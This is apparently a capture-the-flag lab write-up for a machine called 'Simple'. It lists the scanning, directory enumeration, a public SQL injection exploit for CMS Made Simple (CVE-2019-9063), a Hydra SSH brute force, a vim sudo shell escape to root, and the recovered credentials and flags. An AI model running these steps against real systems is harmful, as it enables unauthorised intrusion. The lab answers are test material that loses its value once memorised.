# Simple

1. did an nmap scan using  
> nmap -A -sV `ip-address`

2. searched for hidden and (un)available pages
> gobuster dir -u http://`ip`/ -w /usr/share/dirb/wordlists/common.txt
>> gubuster dir -u http://`ip`/ -x txt,php,html -w /usr/share/dirb/wordlists/common.txt -t 200 2>/dev/null

3. had to look for vulnerabilities, in particular a CVE one, ended up finding CVE-2019-9063 using
> searchsploit cms made simple
	- then look for a specific one for the right 2.2.8 version (ish) and double check on `cve details` for more info

4. download the exploit to use on website
> searchsploit -m 46635 
>> change + fix python file if needed

5. run python program/ecxploit
> python 46635.py -u http://`ip`/simple/ --crack -w /usr/share/wordlists/rockyou.txt

6. found that:
> salt =  1dac0d92e9fa6bb2
> username = mitch
> email = admin@admin.com
> try: 0c01f4468bd75d7a84c7eb73846e8d96($)

7. the python program did not work as expected to find password, nor did hashcat (10 and 20) so used hydra:
> hydra -l `username` -P /usr/share/wordlists/rockyou.txt ssh://`ip`:2222 -t 4

8. gives the password `secret`
9. connect to ssh
> ssh -p 2222 username@ip

10. open user.txt to get flag `G00d j0b, keep up!`
> cat user.txt

12. go to password file to find other users in home directory to find `sunbath`
> /etc/passwd

12. run and see what privileges you can get
> sudo -l

13. use vim to upgrade
> sudo vim -c ":!/bin/sh"

14. look around to find another file `root.txt` whih contains the root flag `W3ll d0n3. You made it!`
> cd ..
> ls -ls
> cs root
> cat root.txt 
	